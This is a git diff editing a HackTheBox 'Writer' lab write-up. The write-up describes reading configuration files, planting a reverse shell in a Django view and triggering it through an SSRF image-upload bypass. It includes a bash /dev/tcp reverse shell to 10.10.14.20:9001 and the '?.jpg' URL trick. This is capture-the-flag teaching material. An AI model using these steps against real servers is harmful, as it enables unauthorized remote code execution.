@@ -32,7 +32,7 @@ clicking around I find a `/stories` directory.
 
 <img src='Images/stories.png'>
 
-It has the option to upload a `.jpg` file from the local computer or to upload a file from a url. 
+It has the option to upload a `.jpg` file from the local computer or from a url. 
 
 <img src='Images/storiesadd.png'>
 
@@ -64,11 +64,11 @@ I'll check the website configuration by including the file `/etc/apache2/sites-e
 
 <img src='Images/sites-enabled.png'>
 
-It shows the root of the website is `/var/www/writer.htb` and there's a `.wsgi` file which I'll check out. It also points to a development site on port `8080` only accessible through localhost. If a can find an SSRF I could interact with this site.
+It shows the root of the website is `/var/www/writer.htb` and there's a `.wsgi` file which I'll check out. It also points to a development site on port `8080` only accessible through localhost. If I can find an SSRF I could interact with this site.
 
 <img src='Images/wsgi.png'>
 
-There's a comment about an `__init__.py` file which I'll read next. The exact location of the file is a bit ambiguous as `from writer import...` could mean a file `writer.py` or a parent directory `/writer`, but trying the path `/var/www/writer.htb/__init__.py` works. This file leaks some credentials:
+There's a comment about an `__init__.py` file which I'll read next. The exact location of the file is a bit ambiguous as `from writer import app` could mean a file `writer.py` containing an `app` object, a parent directory `/writer` containing `app.py` or `writer/__init__.py` containing an `app` object, but trying the path `/var/www/writer.htb/__init__.py` works. This file leaks some credentials:
 
 <img src='Images/__init__.png'>
 
@@ -91,7 +91,7 @@ urlpatterns = [
 ]
 ```
 
-This says any URI will redirect to `/home` and load `views.home_page`. This file imports `view.py` which contains the `home_page` function
+The `r'^$'` matches an empty url resource path i.e. `http://127.0.0.1:8080/` and requesting this url will redirect to `/home` and load `views.home_page`. This file imports `views.py` which contains the `home_page` object
 
 ```
 from django.shortcuts import render
@@ -102,9 +102,9 @@ def home_page(request):
     return render(request,template_name)
 ```
 
-so I can write a reverse shell into the `home_page` function and it will execute when I load any page on the site. Since this site isn't accessible externally I'll need an SSRF to trigger the payload. An SSRF is when you send a specially crafted request to a server and the server executes a request on your behalf. This allows access to functionality you can't directly obtain. Luckily, when we uploaded the `.jpg` files to the `/stories` directory there was an option to upload from a url. If we get the server to process a request to `127.0.0.1:8080` we'll be able to execute our payload.
+so I can write a reverse shell into the `home_page` function and it will execute when I the site. Since this site isn't accessible externally I'll need an SSRF to trigger the payload. An SSRF is when you send a specially crafted request to a server and the server executes a request on your behalf. This allows access to functionality you can't directly obtain. Luckily, when we uploaded the `.jpg` files to the `/stories` directory there was an option to upload from a url. If we get the server to process a request to `127.0.0.1:8080` we'll be able to execute our payload.
 
-I'll use the reverse shell `/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.20/9001 0>&1"`, base64 encode it to avoid special characters and use `os.sytem(.)` to execute shell commands. All together `views.py` becomes
+I'll use the reverse shell `/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.20/9001 0>&1"`, base64 encode it to avoid special characters and use `os.sytem()` to execute shell commands. All together `views.py` becomes
 
 ```
 from django.shortcuts import render
@@ -123,7 +123,7 @@ I'll upload this to the share with
 
 and start a listener on port `9001`.
 
-On `/stories/add` I'll upload a file from url. I just put `http://google.com` as there's some client side filtering, but I'll intercept the request in burpsuite and modify the url there. I know from the source code the filename/url must contain `.jpg` so I'll put the `image_url` as `http://127.0.01:8080/?.jpg`
+On `/stories/add` I'll upload a file from url. I just put `http://google.com` as there's some client side filtering, but I'll intercept the request in burpsuite and modify the url there. I know from the source code the filename/url must contain `.jpg` so I'll put the `image_url` as `http://127.0.01:8080/?.jpg` which matches an empty url resource path as the `?.jpg` acts as a fake query parameter. An anchor `#.jpg` also works.
 
 <img src='Images/ssrf.png'>
 
